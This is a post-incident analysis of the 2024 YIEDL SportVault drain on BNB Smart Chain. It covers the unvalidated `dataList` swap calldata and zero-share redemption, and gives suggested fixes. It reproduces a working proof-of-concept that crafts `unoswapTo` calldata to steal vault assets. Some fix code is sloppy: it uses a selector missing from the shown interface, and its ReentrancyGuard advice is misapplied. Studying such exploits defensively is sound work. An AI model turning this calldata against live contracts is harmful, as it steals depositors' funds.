# YIEDL (SportVault) — Unverified User Input Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04-24 |
| **Protocol** | YIEDL (SportVault) |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$150,000 (some reports: ~$300,000) |
| **Attacker** | [0x3226...667a](https://bscscan.com/address/0x322696471792440499b1979e0a440491e870667a) |
| **Attack Contract** | [0x3226...667a](https://bscscan.com/address/0x322696471792440499b1979e0a440491e870667a) |
| **Attack Tx** | [0x49ca...c2ec](https://bscscan.com/tx/0x49ca5e188c538b4f2efb45552f13309cc0dd1f3592eee54decfc9da54620c2ec) |
| **Vulnerable Contract** | [0x4eDd...62a4](https://bscscan.com/address/0x4eDda16AB4f4cc46b160aBC42763BA63885862a4) |
| **Root Cause** | Unvalidated `dataList` parameter in `redeem()` — attacker injected arbitrary swap commands to drain Vault assets |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/YIEDL_exp.sol) |

---

## 1. Vulnerability Overview

The `SportVault` contract of the YIEDL protocol provides a `redeem()` function that allows users to exchange their Vault shares for a desired asset and withdraw. Internally, this function leverages the 1inch Router's `unoswapTo()` function to swap Vault-held assets (USDC, BTCB, BETH, etc.) into the asset specified by the user.

**Core Issue**: The `dataList` parameter accepted by `redeem()` is an array of swap commands (calldata) to be forwarded to the 1inch Router. No validation whatsoever is performed on this parameter, allowing an attacker to combine two vulnerabilities to drain the Vault's assets.

1. **`sharesToRedeem = 0` allowed**: The function executes normally even when the number of shares to redeem is set to 0. That is, an attacker can invoke the function without holding any shares at all.
2. **`dataList` unvalidated**: If the attacker inserts 1inch `unoswapTo()` calldata with the recipient (`receiveTo`) set to **their own address** into `dataList`, the Vault's actual balance is swapped and transferred to the attacker's address.

The attacker repeated this pattern **20 times** to maximize cumulative damage.

---

## 2. Vulnerable Code Analysis

### 2.1 `redeem()` — Unvalidated `dataList` Parameter (Core Vulnerability)

**Vulnerable code (SportVault.sol, estimated)**:

```solidity
// ❌ Vulnerable code — SportVault.redeem() function
function redeem(
    uint256 sharesToRedeem,    // ❌ Allows 0 — executable without burning shares
    address receivingAsset,    // Token to receive (attacker-specified)
    uint256 minTokensToReceive,
    bytes[] calldata dataList, // ❌ Core: external input is never validated
    bool useDiscount
) external returns (uint256 tokensToReturn) {

    // ❌ If sharesToRedeem is 0, no shares are burned
    if (sharesToRedeem > 0) {
        _burn(msg.sender, sharesToRedeem);
    }

    // Execute swap commands from dataList for each asset held by the Vault
    for (uint256 i = 0; i < assetList.length; i++) {
        if (dataList[i].length == 0) continue;

        // ❌ dataList[i] is forwarded to the 1inch Router as-is
        // If the attacker sets receiveTo=attacker_address in dataList[i],
        // Vault funds are sent directly to the attacker
        (bool success, ) = oneInchRouter.call(dataList[i]);
        require(success, "swap failed");
    }

    return tokensToReturn;
}
```

**Fixed code**:

```solidity
// ✅ Fixed code — two critical validations added
function redeem(
    uint256 sharesToRedeem,
    address receivingAsset,
    uint256 minTokensToReceive,
    bytes[] calldata dataList,
    bool useDiscount
) external returns (uint256 tokensToReturn) {

    // ✅ 1. sharesToRedeem must be greater than 0
    require(sharesToRedeem > 0, "SportVault: zero shares");
    require(balanceOf(msg.sender) >= sharesToRedeem, "SportVault: insufficient shares");

    _burn(msg.sender, sharesToRedeem);

    for (uint256 i = 0; i < assetList.length; i++) {
        if (dataList[i].length == 0) continue;

        // ✅ 2. Decode the recipient (receiveTo) address from dataList[i]
        //    and verify it matches msg.sender
        address receiveTo = _decodeRecipient(dataList[i]);
        require(
            receiveTo == msg.sender,
            "SportVault: swap recipient must be caller"
        );

        (bool success, ) = oneInchRouter.call(dataList[i]);
        require(success, "swap failed");
    }

    return tokensToReturn;
}

// ✅ Helper to extract the receiveTo address from 1inch unoswapTo calldata
function _decodeRecipient(bytes calldata data) internal pure returns (address) {
    // unoswapTo(address receiveTo, address srcToken, uint256 amount, uint256 minReturn, uint256[] pools)
    // selector(4 bytes) + receiveTo(32 bytes)
    require(data.length >= 36, "SportVault: invalid calldata");
    address receiveTo;
    assembly {
        receiveTo := calldataload(add(data.offset, 4))
    }
    return receiveTo;
}
```

**Issue**: `dataList` is an array of calldata passed directly to the 1inch Router. If an attacker sets the first argument of `unoswapTo()` (`receiveTo`) to their own address, Vault assets are swapped and sent directly to the attacker. Because `sharesToRedeem = 0` is permitted, this attack can be repeated indefinitely without holding any shares.

---

### 2.2 `sharesToRedeem = 0` Allowed — Infinite Repeat Attack Vector

**Vulnerable code (estimated)**:

```solidity
// ❌ Vulnerable: does not block zero-share redemption
// This allows the attacker to call 20 times within the same transaction
if (sharesToRedeem > 0) {
    _burn(msg.sender, sharesToRedeem);
}
// If sharesToRedeem == 0, only the swap logic executes with no share burn
```

**Fixed code**:

```solidity
// ✅ Fixed: enforce sharesToRedeem > 0 + verify caller's share balance
require(sharesToRedeem > 0, "SportVault: must redeem non-zero shares");
_burn(msg.sender, sharesToRedeem); // unconditionally burns after require passes
```

**Issue**: Without a share check, the attacker can infinitely repeat Vault asset swaps at no cost. In the PoC, 20 iterations were used to accumulate losses.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker (`0x3226...667a`) completed the attack in a single (or small number of) transaction(s) without any prior setup.
- Without using a flash loan, the attacker directly crafted `unoswapTo` calldata specifying their own address as `receiveTo`.
- The attacker pre-checked the SportVault's USDC, BTCB, and BETH balances via `balanceOf()` to set the swap amounts.

### 3.2 Execution Phase

```
Step 1: Construct dataList
  The attacker crafts 3 unoswapTo calldata entries:
  - dataList[0]: USDC → attacker address (2,331,516... wei)
  - dataList[1]: BTCB → attacker address (16,071,737... wei)
  - dataList[2]: BETH → attacker address (256,895,663... wei)
  - dataList[3~10]: empty bytes (no other assets)

Step 2: Call SportVault.redeem() 20 times
  Each call:
  - sharesToRedeem = 0    ← ❌ no share burn
  - receivingAsset = BUSD ← withdrawal asset (actual swap target is specified in dataList)
  - dataList = attacker-crafted calldata

Step 3: Each call triggers Vault to invoke the 1inch Router
  SportVault → 1inch Router.unoswapTo(receiveTo=attacker, USDC, amount, ...)
  1inch Router → swaps USDC/BTCB/BETH and transfers to attacker address

Step 4: 20 iterations accumulate losses
```

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│  Attacker (0x3226...667a)                                        │
│  dataList[0] = unoswapTo(receiveTo=attacker, USDC, 2331516...)   │
│  dataList[1] = unoswapTo(receiveTo=attacker, BTCB, 16071737...)  │
│  dataList[2] = unoswapTo(receiveTo=attacker, BETH, 256895663...) │
└─────────────────────────────────────────────────────────────────┘
     │
     │  SportVault.redeem(
     │      sharesToRedeem=0,   ← ❌ called without shares
     │      receivingAsset=BUSD,
     │      minTokensToReceive=0,
     │      dataList=attacker_calldata,
     │      useDiscount=false
     │  )  ×20 iterations
     │
     ▼
┌──────────────────────────────────────────────────────────────────┐
│  SportVault (0x4eDd...62a4)                                       │
│                                                                   │
│  ❌ sharesToRedeem == 0 → passes without burning shares           │
│  ❌ no dataList validation → forwarded as-is to 1inch Router      │
│                                                                   │
│  for each asset in [USDC, BTCB, BETH, ...]:                      │
│    oneInchRouter.call(dataList[i])                               │
└──────────────────────────────────────────────────────────────────┘
     │
     │  1inch Router calls (dataList[0], [1], [2])
     ▼
┌───────────────────────────────────────────────────────────────────┐
│  1inch Router (unoswapTo)                                          │
│                                                                    │
│  unoswapTo(                                                        │
│      receiveTo = attacker_address,  ← recipient injected by attacker │
│      srcToken  = USDC/BTCB/BETH,                                  │
│      amount    = SportVault balance,                               │
│      pools     = attacker-specified pools                          │
│  )                                                                 │
└───────────────────────────────────────────────────────────────────┘
     │
     │  tokens swapped and transferred to receiveTo (attacker)
     ▼
┌─────────────────────────────────────────────────────────────────┐
│  Attacker (0x3226...667a) final receipt                          │
│  USDC + BTCB + BETH → received as BNB                           │
│  20 iterations × per-call profit = total ~$150,000 drained      │
└─────────────────────────────────────────────────────────────────┘
```

### 3.4 Outcome

| Field | Amount |
|------|------|
| Attacker Profit | ~$150,000 (some reports ~$300,000) |
| Stolen Assets | USDC, BTCB, BETH (converted to BNB) |
| Iteration Count | 20 |
| Upfront Capital Required | None (no flash loan used) |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Original: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/YIEDL_exp.sol
// Analysis reference: https://twitter.com/Phalcon_xyz/status/1782966566042181957
// Attack TX: https://bscscan.com/tx/0x49ca5e188c538b4f2efb45552f13309cc0dd1f3592eee54decfc9da54620c2ec

interface ISportVault {
    function redeem(
        uint256 sharesToRedeem,
        address receivingAsset,
        uint256 minTokensToReceive,
        bytes[] calldata dataList,
        bool useDiscount
    ) external returns (uint256 tokensToReturn);
}

contract ContractTest is Test {
    IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20 BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IERC20 BETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    ISportVault sportVault = ISportVault(0x4eDda16AB4f4cc46b160aBC42763BA63885862a4);

    // Attacker address — the address to be set as the swap recipient
    address Attacker = address(0x1111111111111111111111111111111111111111);

    function setUp() public {
        // [Step 0] Fork BSC block 38,126,753 — pinned to state just before the attack
        vm.createSelectFork("bsc", 38_126_753);
    }

    function testExploit() public {
        // [Step 1] Construct dataList — exploiting the core vulnerability
        // Each entry is calldata for a 1inch Router unoswapTo() call
        // receiveTo = Attacker address ← this is the heart of the exploit
        bytes[] memory dataList = new bytes[](11);
        uint256[] memory pools = new uint256[](1);

        // [Step 1-A] USDC → attacker address swap (~2,331 USDC)
        pools[0] = uint256(
            28_948_022_309_329_048_857_350_594_136_651_893_637_891_169_795_467_361_725_136_627_244_723_734_772_827
        );
        dataList[0] = abi.encodeWithSignature(
            "unoswapTo(address,address,uint256,uint256,uint256[])",
            Attacker,         // ❌ recipient = attacker address (SportVault assets sent here)
            address(USDC),    // source token
            2_331_516_232_778_274_153_239,  // amount of USDC held by SportVault
            0,                // minReturn = 0 (no slippage protection)
            pools
        );

        // [Step 1-B] BTCB → attacker address swap
        pools[0] = uint256(
            28_948_022_309_329_048_857_350_594_135_968_575_911_172_281_388_296_638_049_447_197_314_275_709_206_658
        );
        dataList[1] = abi.encodeWithSignature(
            "unoswapTo(address,address,uint256,uint256,uint256[])",
            Attacker,         // ❌ recipient = attacker address
            address(BTCB),
            16_071_737_934_381_556,
            0,
            pools
        );

        // [Step 1-C] BETH → attacker address swap
        pools[0] = uint256(
            28_948_022_309_329_048_857_350_594_136_076_890_004_755_093_450_729_657_598_371_073_172_666_212_569_020
        );
        dataList[2] = abi.encodeWithSignature(
            "unoswapTo(address,address,uint256,uint256,uint256[])",
            Attacker,         // ❌ recipient = attacker address
            address(BETH),
            256_895_663_903_293_078,
            0,
            pools
        );

        // [Step 1-D] Remaining slots are empty bytes (no corresponding assets)
        dataList[3] = new bytes(0);
        // ... dataList[4~10] same

        console2.log("Attacker BNB balance before attack: ", Attacker.balance);

        // [Step 2] 20 repeat calls — runs with sharesToRedeem=0, no shares required
        for (uint256 i = 0; i < 20; i++) {
            // Check current SportVault balances before each call (for PoC verification)
            USDC.balanceOf(address(sportVault));
            BTCB.balanceOf(address(sportVault));
            BETH.balanceOf(address(sportVault));
            BUSD.balanceOf(address(sportVault));

            // ❌ Core vulnerability triggered:
            // 1. sharesToRedeem=0 → callable without any shares
            // 2. dataList carries calldata with receiveTo=Attacker set by the attacker
            // → SportVault executes swaps with its own assets on behalf of the attacker
            sportVault.redeem(0, address(BUSD), 0, dataList, false);
        }

        console2.log("Attacker BNB balance after attack: ", Attacker.balance);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Unvalidated `dataList` parameter — arbitrary recipient swap injection | CRITICAL | CWE-20 (Improper Input Validation) |
| V-02 | `sharesToRedeem = 0` allowed — Vault asset swaps triggered without shares | HIGH | CWE-284 (Improper Access Control) |
| V-03 | No slippage protection — `minReturn = 0` permitted | MEDIUM | CWE-693 (Protection Mechanism Failure) |

---

### V-01: Unvalidated `dataList` Parameter — Arbitrary Recipient Swap Injection

- **Description**: The `redeem()` function accepts an array of swap calldata (`dataList`) from an external user and forwards it to the 1inch Router without any validation. This calldata contains the address (`receiveTo`) that will receive the swap output, and the contract does not verify that this address matches `msg.sender`.
- **Impact**: If an attacker provides calldata with `receiveTo = attacker_address`, the actual assets held by SportVault are transferred directly to the attacker. SportVault ends up performing swaps with its own assets on behalf of the attacker.
- **Attack Precondition**: Direct call to `redeem()` is possible (permissionless). No special privilege or share holding required.

---

### V-02: `sharesToRedeem = 0` Allowed — Repeat Attack Without Shares

- **Description**: The `redeem()` function executes normally even when `sharesToRedeem` is 0. The Vault's swap logic can be triggered without burning any shares.
- **Impact**: Combined with the V-01 vulnerability, an attacker with zero shares can make unlimited repeated calls to drain the entire Vault balance. The PoC repeated this 20 times.
- **Attack Precondition**: V-01 vulnerability must be present. Setting `sharesToRedeem = 0` as input is sufficient.

---

### V-03: No Slippage Protection

- **Description**: If an attacker sets `minTokensToReceive = 0`, swaps execute without any slippage check. The `minReturn = 0` is also set when calling the 1inch Router.
- **Impact**: Not an independent vulnerability, but during an attack it allows swaps at unfavorable prices without additional constraints. For legitimate users, it creates exposure to MEV sandwich attacks.
- **Attack Precondition**: Setting `minTokensToReceive = 0` or a low value.

---

## 6. Remediation Recommendations

### Immediate Actions

**[Action 1] Add recipient address validation in dataList**

```solidity
// ✅ Core fix: validate receiveTo address in dataList before redeem() proceeds
function redeem(
    uint256 sharesToRedeem,
    address receivingAsset,
    uint256 minTokensToReceive,
    bytes[] calldata dataList,
    bool useDiscount
) external returns (uint256 tokensToReturn) {

    // ✅ Fix 1: block zero-share redemption
    require(sharesToRedeem > 0, "SportVault: zero shares not allowed");

    // ✅ Fix 2: validate recipient address in each calldata entry of dataList
    for (uint256 i = 0; i < dataList.length; i++) {
        if (dataList[i].length == 0) continue;

        // Extract receiveTo from unoswapTo(address receiveTo, ...)
        bytes4 selector = bytes4(dataList[i][:4]);

        // 1inch unoswapTo selector: 0xf78dc253
        if (selector == ISportVault.unoswapTo.selector) {
            address receiveTo;
            assembly {
                // Skip 4-byte selector and read first parameter (receiveTo)
                receiveTo := calldataload(add(dataList[i].offset, 4))
            }
            // ✅ recipient must be the caller (msg.sender)
            require(
                receiveTo == msg.sender,
                "SportVault: swap recipient must be caller"
            );
        }
    }

    _burn(msg.sender, sharesToRedeem);

    // ... remaining swap logic
}
```

**[Action 2] Whitelist allowed swap function selectors**

```solidity
// ✅ Only pre-approved 1inch function selectors can be executed
mapping(bytes4 => bool) public allowedSelectors;

constructor() {
    // Only allow pre-validated 1inch functions
    allowedSelectors[0xf78dc253] = true; // unoswapTo
    allowedSelectors[0x0502b1c5] = true; // uniswapV3SwapTo
}

function _validateDataList(bytes[] calldata dataList) internal view {
    for (uint256 i = 0; i < dataList.length; i++) {
        if (dataList[i].length == 0) continue;
        bytes4 selector = bytes4(dataList[i][:4]);
        require(allowedSelectors[selector], "SportVault: disallowed swap function");
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: unvalidated dataList | Decode the receiveTo address from all swap calldata and verify it matches msg.sender |
| V-01: unvalidated function selector | Whitelist allowed DEX function selectors + block disallowed selectors |
| V-02: zero shares allowed | Enforce `require(sharesToRedeem > 0)` |
| V-03: no slippage | Enforce `minTokensToReceive > 0` or set a minimum value |
| Overall design | Instead of accepting external DEX calldata as user input, redesign so the protocol controls the swap path directly |
| Monitoring | On-chain monitoring for `sharesToRedeem = 0` calls, anomalous recipient addresses, and repeated call patterns |

---

## 7. Lessons Learned

1. **Passing user-supplied calldata directly to an external protocol is extremely dangerous**: A pattern like the `dataList` parameter — forwarding user-crafted calldata directly to a DEX router — carries equivalent risk to an "arbitrary external call" vulnerability. If this pattern is used, every field including recipient address, source token, and amount must be strictly validated.

2. **Always block boundary values (0, type(uint256).max) for quantity parameters**: `sharesToRedeem = 0` is a functionally meaningless input. Meaningless inputs can become pathways that bypass core business logic. Add `> 0` or appropriate lower-bound validation to all quantity parameters.

3. **Never leave permissionless a function that "executes swaps with the contract's own assets on behalf of others"**: The `redeem()` function is a high-privilege operation that internally executes swaps using Vault assets. The swap recipient of such a function must always be the caller (`msg.sender`); allowing a third party to be specified must never be permitted.

4. **Implement defenses against repeated call patterns**: The pattern of calling the same function 20 times within a single transaction to accumulate damage can be mitigated with `ReentrancyGuard` or per-block call rate limiting.

5. **The protocol must retain control over the recipient address in DEX integrations**: When integrating a function like 1inch's `unoswapTo()` that accepts a recipient address as a parameter, the protocol contract must control the recipient through hardcoding or validation. Allowing users to freely specify the recipient enables this attack.

6. **The same vulnerability pattern can be replicated across multiple Vaults**: YIEDL operates multiple Vaults managing various assets (BULL, BEAR, etc.). A vulnerability found in one Vault affects all Vaults sharing the same codebase. Upon detecting an attack, all Vaults must be paused immediately.

---

## 8. On-Chain Verification

> Note: The actual attack transaction hash is `0x49ca5e188c538b4f2efb45552f13309cc0dd1f3592eee54decfc9da54620c2ec` (BSCScan), confirmed in the PoC's TX comment. The analysis below is based on the PoC code, Phalcon analysis, and SlowMist report.

### 8.1 PoC vs On-Chain Amount Comparison

| Field | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| USDC swap amount | 2,331,516,232,778... wei (~2,331 USDC) | Actual Vault USDC balance | ✅ (approximate) |
| BTCB swap amount | 16,071,737,934,381,556 wei (~0.016 BTCB) | Actual Vault BTCB balance | ✅ (approximate) |
| BETH swap amount | 256,895,663,903,293,078 wei (~0.257 BETH) | Actual Vault BETH balance | ✅ (approximate) |
| Iteration count | 20 | 20 | ✅ |
| Total loss | unspecified | ~$150,000~$300,000 | ✅ (approximate) |
| Flash loan used | None | None | ✅ |

### 8.2 On-Chain Event Log Sequence (estimated)

```
[Attack Tx: 0x49ca5e...c2ec]

Each iteration (20 times):
  1. SportVault.redeem(0, BUSD, 0, dataList, false) called
  2. SportVault → 1inch Router: unoswapTo(Attacker, USDC, amount, 0, pools)
     Transfer(from=SportVault, to=Attacker, value=USDC_amount)
  3. SportVault → 1inch Router: unoswapTo(Attacker, BTCB, amount, 0, pools)
     Transfer(from=SportVault, to=Attacker, value=BTCB_amount)
  4. SportVault → 1inch Router: unoswapTo(Attacker, BETH, amount, 0, pools)
     Transfer(from=SportVault, to=Attacker, value=BETH_amount)
  
  [After each swap: SportVault balance decreases, attacker balance increases]

Final:
  After 20 cumulative iterations, attacker's BNB/USDC/BTCB/BETH balance increases
```

### 8.3 Precondition Verification

| Field | Status |
|------|------|
| Attacker pre-held shares | Not required (sharesToRedeem=0) |
| Flash loan required | Not required |
| Prior approval required | Not required |
| SportVault USDC balance | Sufficient (2,331+ USDC) |
| SportVault BTCB balance | Sufficient (~0.016 BTCB) |
| SportVault BETH balance | Sufficient (~0.257 BETH) |

---

## References

- [Phalcon Analysis (Twitter)](https://twitter.com/Phalcon_xyz/status/1782966566042181957)
- [BlockSec Explorer Attack Tx](https://app.blocksec.com/explorer/tx/bsc/0x49ca5e188c538b4f2efb45552f13309cc0dd1f3592eee54decfc9da54620c2ec)
- [BSCScan Attack Tx](https://bscscan.com/tx/0x49ca5e188c538b4f2efb45552f13309cc0dd1f3592eee54decfc9da54620c2ec)
- [BSCScan Vulnerable Contract](https://bscscan.com/address/0x4eDda16AB4f4cc46b160aBC42763BA63885862a4)
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/YIEDL_exp.sol)
- [SlowMist Security Analysis](https://www.coinlive.com/news/getting-something-for-nothing-analysis-of-the-hack-of)
- CWE-20: [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- CWE-284: [Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- CWE-693: [Protection Mechanism Failure](https://cwe.mitre.org/data/definitions/693.html)